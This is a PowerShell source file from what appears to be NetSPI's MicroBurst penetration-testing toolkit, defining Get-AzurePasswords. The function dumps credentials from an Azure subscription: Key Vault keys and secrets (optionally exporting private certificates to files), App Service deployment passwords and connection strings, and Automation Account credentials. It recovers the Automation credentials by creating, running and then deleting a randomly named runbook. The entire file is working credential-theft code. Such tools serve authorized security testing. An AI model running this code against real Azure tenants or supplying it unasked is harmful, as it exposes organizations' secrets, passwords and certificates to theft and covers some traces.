<#
    File: Get-AzurePasswords.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2018
    Description: PowerShell function for dumping Azure credentials.
#>


# Check if the AzureRM Module is installed and imported
if(!(Get-Module AzureRM)){
    try{Import-Module AzureRM -ErrorAction Stop}
    catch{Install-Module -Name AzureRM -Confirm}
    }

# Check if the Azure Module is installed and imported
if(!(Get-Module Azure)){
    try{Import-Module Azure -ErrorAction Stop}
    catch{Install-Module -Name Azure -Confirm}
    }


Function Get-AzurePasswords
{
<#
    .SYNOPSIS
        Dumps all available credentials from an Azure subscription. Pipe to Out-Gridview or Export-CSV for easier parsing.
    .DESCRIPTION
        This function will look for any available credentials and certificates store in Key Vaults, App Services Configurations, and Automation accounts. 
        If the Azure management account has permissions, it will read the values directly out of the Key Vaults and App Services Configs.
        A runbook will be spun up for dumping automation account credentials, so it will create a log entry in the automation jobs.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER ExportCerts
        Flag for saving private certs locally.           
    .EXAMPLE
        PS C:\MicroBurst> Get-AzurePasswords -Verbose | Out-GridView
        VERBOSE: Logged In as testaccount@example.com
        VERBOSE: Getting List of Key Vaults...
        VERBOSE: 	Exporting items from example-private
        VERBOSE: 	Exporting items from PasswordStore
        VERBOSE: 		Getting Key value for the example-Test Key
        VERBOSE: 		Getting Key value for the RSA-KEY-1 Key
        VERBOSE: 		Getting Key value for the TestCertificate Key
        VERBOSE: 		Getting Secret value for the example-Test Secret
        VERBOSE: 			Unable to export Secret value for example-Test
        VERBOSE: 		Getting Secret value for the SuperSecretPassword Secret
        VERBOSE: 		Getting Secret value for the TestCertificate Secret
        VERBOSE: Getting List of Azure App Services...
        VERBOSE: 	Profile available for example1
        VERBOSE: 	Profile available for example2
        VERBOSE: 	Profile available for example3
        VERBOSE: Getting List of Azure Automation Accounts...
        VERBOSE: 	Getting credentials for testAccount using the lGVeLPZARrTJdDu.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: Password Dumping Activities Have Completed

    .LINK
    https://blog.netspi.com/get-azurepasswords
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Key Vault Keys.")]
        [ValidateSet("Y","N")]
        [String]$Keys = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump App Services Configurations.")]
        [ValidateSet("Y","N")]
        [String]$AppServices = "Y",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Automation Accounts.")]
        [ValidateSet("Y","N")]
        [String]$AutomationAccounts = "Y",

        [Parameter(Mandatory=$false,
        HelpMessage="Export the certificates to local files.")]
        [ValidateSet("Y","N")]
        [string]$ExportCerts = "N"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzureRmContext
    $accountName = $LoginStatus.Account
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Login-AzureRmAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
    if ($Subscription){        
        Select-AzureRmSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzureRmSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzurePasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Create data table to house results
    $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("Type") | Out-Null
    $TempTblCreds.Columns.Add("Name") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Value") | Out-Null
    $TempTblCreds.Columns.Add("PublishURL") | Out-Null
    $TempTblCreds.Columns.Add("Created") | Out-Null
    $TempTblCreds.Columns.Add("Updated") | Out-Null
    $TempTblCreds.Columns.Add("Enabled") | Out-Null
    $TempTblCreds.Columns.Add("Content Type") | Out-Null
    $TempTblCreds.Columns.Add("Vault") | Out-Null
    $TempTblCreds.Columns.Add("Subscription") | Out-Null

    if($Keys -eq 'Y'){
        # Key Vault Section
        $vaults = Get-AzureRmKeyVault
        Write-Verbose "Getting List of Key Vaults..."
        $subName = (Get-AzureRmSubscription -SubscriptionId $Subscription).Name

        foreach ($vault in $vaults){
            $vaultName = $vault.VaultName

            try{$keys = Get-AzureKeyVaultKey -VaultName $vault.VaultName -ErrorAction Stop}
            catch{Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"; continue}

            # Dump Keys
            Write-Verbose "`tExporting items from $vaultName"
            foreach ($key in $keys){
                $keyname = $key.Name
                Write-Verbose "`t`tGetting Key value for the $keyname Key"
                $keyValue = Get-AzureKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
            
                # Add Key to the table
                $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null

                }

            # Dump Secrets
            try{$secrets = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
            catch{Write-Verbose "`t`tUnable to access secrets for the $vaultName key vault"; Continue}

            foreach ($secret in $secrets){
                $secretname = $secret.Name
                Write-Verbose "`t`tGetting Secret value for the $secretname Secret"
                Try{
                    $secretValue = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop

                    $secretType = $secretValue.ContentType

                    # Write Private Certs to file
                    if (($ExportCerts -eq "Y") -and ($secretType  -eq "application/x-pkcs12")){
                            Write-Verbose "`t`t`tWriting certificate for $secretname to $pwd\$secretname.pfx"
                            $secretBytes = [convert]::FromBase64String($secretValue.SecretValueText)
                            [IO.File]::WriteAllBytes("$pwd\$secretname.pfx", $secretBytes)
                        }
                
                    # Add Secret to the table
                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValue.SecretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null

                    }

                Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}

            }

        }
    }

    if($AppServices -eq 'Y'){
        # App Services Section
        Write-Verbose "Getting List of Azure App Services..."

        # Read App Services configs
        $appServs = Get-AzureRmWebApp
        $appServs | ForEach-Object{
            $appServiceName = $_.Name
            $resourceGroupName = Get-AzureRmResource -ResourceId $_.Id | select ResourceGroupName

            # Get each config 
            try{
                [xml]$configFile = Get-AzureRmWebAppPublishingProfile -ResourceGroup $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
            
                if ($configFile){
                    foreach ($profile in $configFile.publishData.publishProfile){
                        # Read Deployment Passwords and add to the output table
                        $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName,$profile.userName,$profile.userPWD,$profile.publishUrl,"N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                    
                        # Parse Connection Strings                    
                        if ($profile.SQLServerDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.SQLServerDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                        if ($profile.mySQLDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.mySQLDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                    }
                    # Grab additional custom connection strings
                    $resourceName = $_.Name+"/connectionstrings"
                    $resource = Invoke-AzureRmResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
                    $propName = $resource.properties | gm -M NoteProperty | select name
                    if($resource.Properties.($propName.Name).type -eq 3){$TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+"-Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null}
                }
                Write-Verbose "`tProfile available for $appServiceName"
            }
            catch{Write-Verbose "`tNo profile available for $appServiceName"}
        }
    }

    if ($AutomationAccounts -eq 'Y'){
        # Automation Accounts Section
        $AutoAccounts = Get-AzureRmAutomationAccount
        Write-Verbose "Getting List of Azure Automation Accounts..."
        foreach ($AutoAccount in $AutoAccounts){

            $verboseName = $AutoAccount.AutomationAccountName

            # Grab the automation cred username
            $autoCred = (Get-AzureRmAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name
            if ($autoCred -eq $null){continue}


            # create runbook in resource group
            Try {

                # Set Random name for the runbook. Prevents conflict issues
                $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                # Write Script to local file
                "`$myCredential = Get-AutomationPSCredential -Name '$autoCred'" | Out-File -FilePath "$pwd\$jobName.ps1" 
                "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                "write-output `$userName" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                "write-output `$password"| Out-File -FilePath "$pwd\$jobName.ps1" -Append

                Write-Verbose "`tGetting credentials for $verboseName using the $jobName.ps1 Runbook"


                Import-AzureRmAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null

                # publish the runbook
                Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null

                # run the runbook and get the job id
                $jobID = Start-AzureRmAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                # Wait for the job to complete
                Write-Verbose "`t`tWaiting for the automation job to complete"
                while($jobstatus.Status -ne "Completed"){
                    $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                }    

                try{
                    # Get the output
                    $jobOutput = (Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary

                    if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
        
                    #write to the table
                    $TempTblCreds.Rows.Add("AzureAutomation Account",$AutoAccount.AutomationAccountName,$jobOutput[0],$jobOutput[1],"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                }
                catch {}

                # clean up
                Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force

                # Clean up local temp file
                Remove-Item $pwd\$jobName.ps1
            }
            Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
        }
    }
    Write-Verbose "Password Dumping Activities Have Completed"

    # Output Creds
    $TempTblCreds
}



